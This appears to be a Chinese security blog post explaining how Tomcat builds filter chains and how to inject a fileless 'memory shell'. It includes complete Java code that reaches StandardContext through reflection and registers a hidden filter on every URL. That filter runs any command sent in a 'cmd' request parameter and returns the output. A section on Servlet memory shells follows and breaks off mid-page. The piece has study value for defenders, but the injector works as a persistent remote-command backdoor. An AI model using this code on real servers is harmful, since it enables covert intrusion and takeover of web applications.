                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1623412713625.png"
                      alt="1623412713625"
                ></p>
<p>阅读上面的说明，这个类还约定了一个事情，那就是如果这个 <code>ServletContext</code> 传递给 <code>ServletContextListener</code> 的 <code>ServletContextListener.contextInitialized</code> 方法，该方法既未在 <code>web.xml</code> 或 <code>web-fragment.xml</code> 中声明，也未使用 <code>javax.servlet.annotation.WebListener</code> 进行注释，则会抛出 <code>UnsupportedOperationException</code> 异常，这个约定其实是非常重要的一点。</p>
<p>接下来看 <code>addFilter</code> 方法，<code>ServletContext</code> 中有三个重载方法，分别接收字符串类型的 <code>filterName</code> 以及 Filter 对象&#x2F;<code>className</code> 字符串&#x2F;Filter 子类的 Class 对象，提供不同场景下添加 filter 的功能，这些方法均返回 <code>FilterRegistration.Dynamic</code> 实际上就是 <code>FilterRegistration</code> 对象。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20221011212148052.png"
                      alt="image-20221011212148052"
                ></p>
<p><code>addFilter</code> 方法实际上就是动态添加 filter 的最核心和关键的方法，但是这个类中同样约定了 <code>UnsupportedOperationException</code> 异常。</p>
<p>由于 <code>Servlet</code> <code>API</code> 只是提供接口定义，具体的实现还要看具体的容器，那我们首先以 Tomcat 7.0.96 为例，看一下具体的实现细节。相关实现方法在 <code>org.apache.catalina.core.ApplicationContext#addFilter</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1623553440934.png"
                      alt="1623553440934"
                ></p>
<p>可以看到，这个方法创建了一个 <code>FilterDef</code> 对象，将 <code>filterName</code>、<code>filterClass</code>、filter 对象初始化进去，使用 <code>StandardContext</code> 的 <code>addFilterDef</code> 方法将创建的 <code>FilterDef</code> 储存在了 <code>StandardContext</code> 中的一个 <code>Hashmap filterDefs</code> 中，然后 new 了一个 <code>ApplicationFilterRegistration</code> 对象并且返回，并没有将这个 Filter 放到 <code>FilterChain</code> 中，单纯调用这个方法不会完成自定义 Filter 的注册。并且这个方法判断了一个状态标记，如果程序以及处于运行状态中，则不能添加 Filter。</p>
<p>这时我们肯定要想，能不能直接操纵 <code>FilterChain</code> 呢？<code>FilterChain</code> 在 Tomcat 中的实现是 <code>org.apache.catalina.core.ApplicationFilterChain</code>，这个类提供了一个 <code>addFilter</code> 方法添加 Filter，这个方法接受一个 <code>ApplicationFilterConfig</code> 对象，将其放在 <code>this.filters</code> 中。答案是可以，但是没用，因为对于每次请求需要执行的 <code>FilterChain</code> 都是动态取得的。</p>
<blockquote>
<p>那Tomcat 是如何处理一次请求对应的 <code>FilterChain</code> 的呢？在 <code>ApplicationFilterFactory</code> 的 <code>createFilterChain</code> 方法中，可以看到流程如下：</p>
<ul>
<li>在 context 中获取 <code>filterMaps</code>，并遍历匹配 url 地址和请求是否匹配；</li>
<li>如果匹配则在 context 中根据 <code>filterMaps</code> 中的 <code>filterName</code> 查找对应的 <code>filterConfig</code>；</li>
<li>如果获取到 filterConfig，则将其加入到 filterChain 中</li>
<li>后续将会循环 filterChain 中的全部 filterConfig，通过 <code>getFilter</code> 方法获取 Filter 并执行 Filter 的 <code>doFilter</code> 方法。</li>
</ul>
<p>通过上述流程可以知道，每次请求的 <code>FilterChain</code> 是动态匹配获取和生成的，如果想添加一个 Filter ，需要在 <code>StandardContext</code> 中 <code>filterMaps</code> 中添加 <code>FilterMap</code>，在 <code>filterConfigs</code> 中添加 <code>ApplicationFilterConfig</code>。这样程序创建时就可以找到添加的 Filter 了。</p>
</blockquote>
<p>在之前的 <code>ApplicationContext</code> 的 <code>addFilter</code> 中将 filter 初始化存储在了 <code>StandardContext</code> 的 <code>filterDefs</code> 中，那后面又是如何添加在其他参数中的呢？</p>
<p>在 <code>StandardContext</code> 的 <code>filterStart</code> 方法中生成了 <code>filterConfigs</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1623566822352.png"
                      alt="1623566822352"
                ></p>
<p>在 <code>ApplicationFilterRegistration</code> 的 <code>addMappingForUrlPatterns</code> 中生成了 <code>filterMaps</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1623566974104.png"
                      alt="1623566974104"
                ></p>
<p>而这两者的信息都是从 <code>filterDefs</code> 中的对象获取的。</p>
<p><strong>在应用程序中动态的添加一个 filter 的思路：</strong></p>
<blockquote>
<ul>
<li><p>调用 ApplicationContext 的 addFilter 方法创建 filterDefs 对象，需要<strong>反射修改应用程序的运行状态</strong>，加完之后再改回来；</p>
</li>
<li><p>调用 StandardContext 的 filterStart 方法生成 filterConfigs；</p>
</li>
<li><p>调用 ApplicationFilterRegistration 的 addMappingForUrlPatterns 生成 filterMaps；</p>
</li>
<li><p>为了兼容某些特殊情况，将我们加入的 filter 放在 filterMaps 的第一位，可以自己修改 HashMap 中的顺序，<strong>也可以在自己调用 StandardContext 的 addFilterMapBefore 直接加在 filterMaps 的第一位</strong>。</p>
</li>
</ul>
</blockquote>
<p><strong>总结一下</strong></p>
<p>过程中遇到的类</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">FilterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</span><br><span class="line"></span><br><span class="line">FilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息</span><br><span class="line"></span><br><span class="line">FilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern</span><br><span class="line"></span><br><span class="line">FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter</span><br><span class="line"></span><br><span class="line">WebXml：存放 web.xml 中内容的类</span><br><span class="line"></span><br><span class="line">ContextConfig：Web应用的上下文配置类</span><br><span class="line"></span><br><span class="line">StandardContext：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper</span><br><span class="line"></span><br><span class="line">StandardWrapperValve：一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet</span><br></pre></td></tr></table></figure></div>

<p>流程</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20210331212905616.png"
                      alt="image-20210331212905616"
                ></p>
<h3 id="大概写个内存马"><a href="#大概写个内存马" class="headerlink" title="大概写个内存马"></a>大概写个内存马</h3><h4 id="先简单理理思路"><a href="#先简单理理思路" class="headerlink" title="先简单理理思路"></a>先简单理理思路</h4><p><strong>在了解了上述逻辑后，在应用程序中动态的添加一个 filter 的思路就清晰了：</strong></p>
<blockquote>
<ul>
<li>调用 <code>ApplicationContext</code> 的 <code>addFilter</code> 方法创建 <code>filterDefs</code> 对象，需要反射修改应用程序的运行状态，加完之后再改回来；</li>
<li>调用 <code>StandardContext</code> 的 <code>filterStart</code> 方法生成 <code>filterConfigs</code>；</li>
<li>调用 <code>ApplicationFilterRegistration</code> 的 <code>addMappingForUrlPatterns</code> 生成 <code>filterMaps</code>；</li>
<li>为了兼容某些特殊情况，将我们加入的 <code>filter</code> 放在 <code>filterMaps</code> 的第一位，可以自己修改 <code>HashMap</code> 中的顺序，也可以在自己调用 <code>StandardContext</code> 的 <code>addFilterMapBefore</code> 直接加在 <code>filterMaps</code> 的第一位。</li>
</ul>
<p>换一种解释</p>
<ol>
<li>根据请求的 URL 从 FilterMaps 中找出与之 URL 对应的 Filter 名称</li>
<li>根据 Filter 名称去 FilterConfigs 中寻找对应名称的 FilterConfig</li>
<li>找到对应的 FilterConfig 之后添加到 FilterChain中，并且返回 FilterChain</li>
<li>filterChain 中调用 internalDoFilter 遍历获取 chain 中的 FilterConfig ，然后从 FilterConfig 中获取 Filter，然后调用 Filter 的 doFilter 方法</li>
</ol>
</blockquote>
<p><strong>可以去看其他师傅写的好的，自己修改修改</strong></p>
<blockquote>
<p>su18师傅写的，做的是访问后使index页面的id+3</p>
<p><a class="link"   href="https://github.com/su18/MemoryShell/commit/38ffaf43782176c47044f588164923c3c5a36b8b#diff-0d6379fd4a157c3267bcf44412fe7df7129c825ccf76abc63786a926c6ae8b98" >项目地址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>胡师傅写的</p>
<p><a class="link"   href="https://github.com/AmTrain-Ricky/JavaMemShellLearn/blob/main/TomcatMemShell/src/main/java/com/tomcat/memshell/Filter/MemFilter.java" >JavaMemShellLearn&#x2F;MemFilter.java at main · AmTrain-Ricky&#x2F;JavaMemShellLearn (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><strong>自己写的</strong></p>
<p>先科普一下Filter建法</p>
<p><strong>自定义 filter（基本上需要的内容）</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter 初始化创建&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行过滤操作&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>不做过多解释，都能看懂</p>
<p>然后在<code>web.xml</code>中注册我们的filter，这里我们设置url-pattern为 我们的项目地址才行，这里因为用了servlet来加载（我这么理解），所以可以写servlet标签就行,要写filter标签也行，这里大概给个范例</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>KoishiAddTomcatFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.tomcat.memshell.Filter.KoishiMemFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>KoishiAddTomcatFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/koishiFilter<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>KoishiAddTomcatFilter<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.tomcat.memshell.Filter.KoishiMemFilter<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>KoishiAddTomcatFilter<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/koishiFilter<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h4 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a><strong>正式开始</strong></h4><p><strong>思路</strong></p>
<blockquote>
<ol>
<li>先拿到 context </li>
<li>创建一个恶意 Filter</li>
<li>利用 FilterDef 对 Filter 进行一个封装</li>
<li>将 FilterDef 添加到 FilterDefs 和 FilterConfig</li>
<li>创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）</li>
</ol>
</blockquote>
<blockquote>
<p><strong>每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启</strong></p>
</blockquote>
<p><strong>前面说到当组装我们的过滤器链的时候 ，是从context中获取到的 FiltersMaps，所以先拿到 context</strong></p>
<p>当我们能直接获取 request 的时候，我们这里可以直接使用如下方法</p>
<p>（当 Web 容器启动的时候会为每个 Web 应用都创建一个 ServletContext 对象，代表当前 Web 应用）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">appctx.setAccessible(true);</span><br><span class="line">    // ApplicationContext 为 ServletContext 的实现类</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">stdctx.setAccessible(true);</span><br><span class="line"> // 这样我们就获取到了 context </span><br><span class="line">StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>如果没有request对象的话可以从当前线程中获取</p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/114625962" >https://zhuanlan.zhihu.com/p/114625962 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>从MBean中获取</p>
<p><a class="link"   href="https://scriptboy.cn/p/tomcat-filter-inject/" >https://scriptboy.cn/p/tomcat-filter-inject/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><strong>Filter 内存马</strong></p>
<p>Filter实现<code>doFilter</code>恶意方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tomcat.util.ClassUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiMemFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;koishi&quot;</span>;</span><br><span class="line">        <span class="comment">// 通过 request 获取 ServletContext 对象</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line">        <span class="comment">// 首先判断名字是否存在，如果不存在我们就进行注入</span></span><br><span class="line">        <span class="keyword">if</span> (servletContext.getFilterRegistration(filterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">            流程 ApplicationContextFacade-&gt;ApplicationContext-&gt;StandardContext</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="comment">// 1.获取 context</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">// ApplicationContext 为 ServletContext 的实现类,这里下面通过反射获取 servletContext 的 context 中的具体属性值</span></span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                <span class="comment">//这里同理，继续反射获取context中的属性值</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">applicationField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                applicationField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">//最终在这里 这样我们就获取到了 StandardContext 下的 HashMap 类型的 filterDefs</span></span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) applicationField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2.创建自定义的Filter对象</span></span><br><span class="line">            <span class="comment">// Tomcat 包下的 ClassUtil 的继承了类加载器，可以用来专门加载Spring下的类</span></span><br><span class="line">            <span class="comment">// Class&lt;?&gt; filterClass = ClassUtil.getClass(ClassUtil.FILTER_STRING);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//恶意 filter</span></span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                        <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                            <span class="comment">//Process process = new ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,req.getParameter(&quot;cmd&quot;)).start();</span></span><br><span class="line">                            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                            servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                            process.destroy();</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建FilterDef</span></span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">                filterDef.setFilterName(filterName);</span><br><span class="line">                <span class="comment">//filterDef.setFilter((Filter)filterClass.newInstance());</span></span><br><span class="line">                filterDef.setFilter(filter);</span><br><span class="line">                <span class="comment">//filterDef.setFilterClass(filterClass.getName());</span></span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建ApplicationFilterConfig</span></span><br><span class="line">                Constructor&lt;?&gt;[] constructor = ApplicationFilterConfig.class.getDeclaredConstructors();</span><br><span class="line">                constructor[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">config</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor[<span class="number">0</span>].newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建FilterMap</span></span><br><span class="line">                <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">                filterMap.setFilterName(filterName);</span><br><span class="line">                <span class="comment">// * 或者 /* 都会匹配所有url路径，这就使内存马再任意页面都可执行</span></span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * Filter拦截方式配置</span></span><br><span class="line"><span class="comment">                 * REQUEST：默认值。浏览器直接请求资源（下面设置成这个的目的应该也是为了直接请求资源，不做过多处理）</span></span><br><span class="line"><span class="comment">                 * FORWARD：转发访问资源</span></span><br><span class="line"><span class="comment">                 * INCLUDE：包含访问资源</span></span><br><span class="line"><span class="comment">                 * ERROR：错误跳转资源</span></span><br><span class="line"><span class="comment">                 * ASYNC：异步访问资源</span></span><br><span class="line"><span class="comment">                 * */</span></span><br><span class="line">                filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 反射将ApplicationFilterConfig放入StandardContext中的filterConfigs中</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">configfield</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">                configfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">// 直接赋值会把别的服务给覆盖掉, 取出再赋值</span></span><br><span class="line">                HashMap&lt;String, ApplicationFilterConfig&gt; filterConfigs = (HashMap&lt;String, ApplicationFilterConfig&gt;) configfield.get(standardContext);</span><br><span class="line">                filterConfigs.put(filterName, config);</span><br><span class="line"></span><br><span class="line">                standardContext.addFilterDef(filterDef);</span><br><span class="line">                <span class="comment">// 将我们的 filterMap 写到第一个</span></span><br><span class="line">                standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">                resp.getOutputStream().write(<span class="string">&quot;inject success ！恭喜&quot;</span>.getBytes());</span><br><span class="line">                resp.getOutputStream().flush();</span><br><span class="line">                resp.getOutputStream().close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter 初始化创建&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行过滤操作&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>







<h2 id="三、Servlet-内存马"><a href="#三、Servlet-内存马" class="headerlink" title="三、Servlet 内存马"></a>三、Servlet 内存马</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h3><p><a class="link"   href="https://blog.csdn.net/angry_program/article/details/118492214" >可以参考的文章（个人感觉讲的相当nice） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Servlet 是 Server Applet（服务器端小程序）的缩写，用来读取客户端发送的数据，处理并返回结果。也是最常见的 Java 技术之一。</p>
<p>与 Filter 相同，本小节也仅仅讨论使用 ServletContext 的相关方法添加 Servlet。还是首先来看一下实现类 <code>ApplicationContext</code> 的 <code>addServlet</code> 方法。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1-16673128653255.png"
                      alt="1"
                ></p>
<p>与上一小节看到的 <code>addFilter</code> 方法十分类似，这个过程简单一点，只有两部走：</p>
<blockquote>
<ul>
<li><code>ApplicationServletRegistration</code> 的 <code>addMapping</code> 方法调用 <code>StandardContext#addServletMapping</code> 方法，在 mapper 中添加 URL 路径与 Wrapper 对象的映射（Wrapper 通过 this.children 中根据 name 获取）</li>
<li>同时在 <code>servletMappings</code> 中添加 URL 路径与 name 的映射。</li>
</ul>
</blockquote>
<h3 id="简单记录一下Servlet的周期"><a href="#简单记录一下Servlet的周期" class="headerlink" title="简单记录一下Servlet的周期"></a>简单记录一下Servlet的周期</h3><h4 id="Servlet的生成与动态添加"><a href="#Servlet的生成与动态添加" class="headerlink" title="Servlet的生成与动态添加"></a>Servlet的生成与动态添加</h4><p><strong>Servlet的生成与动态添加依次进行了以下步骤（详情见参考文章）：</strong></p>
<blockquote>
<ol>
<li><p>通过 context.createWapper() 创建 Wapper 对象；</p>
</li>
<li><p>设置 Servlet 的 LoadOnStartUp 的值；</p>
</li>
<li><p>设置 Servlet 的 Name；</p>
</li>
<li><p>设置 Servlet 对应的 Class；</p>
</li>
<li><p>将 Servlet 添加到 context 的 children 中；</p>
</li>
<li><p>将 url 路径和 servlet 类做映射。</p>
</li>
</ol>
</blockquote>
<h4 id="Servlet-装载过程"><a href="#Servlet-装载过程" class="headerlink" title="Servlet 装载过程"></a>Servlet 装载过程</h4><p>在 <code>org.apache.catalina.coreStandardWapper#loadServlet()</code> 下断点调试：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png"
                      alt="img"
                ></p>
<p>回溯到 <code>org.apache.catalina.core.StandardContext#startInternal</code>方法中可以看到，是在加载完Listener和Filter之后，才装载Servlet：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
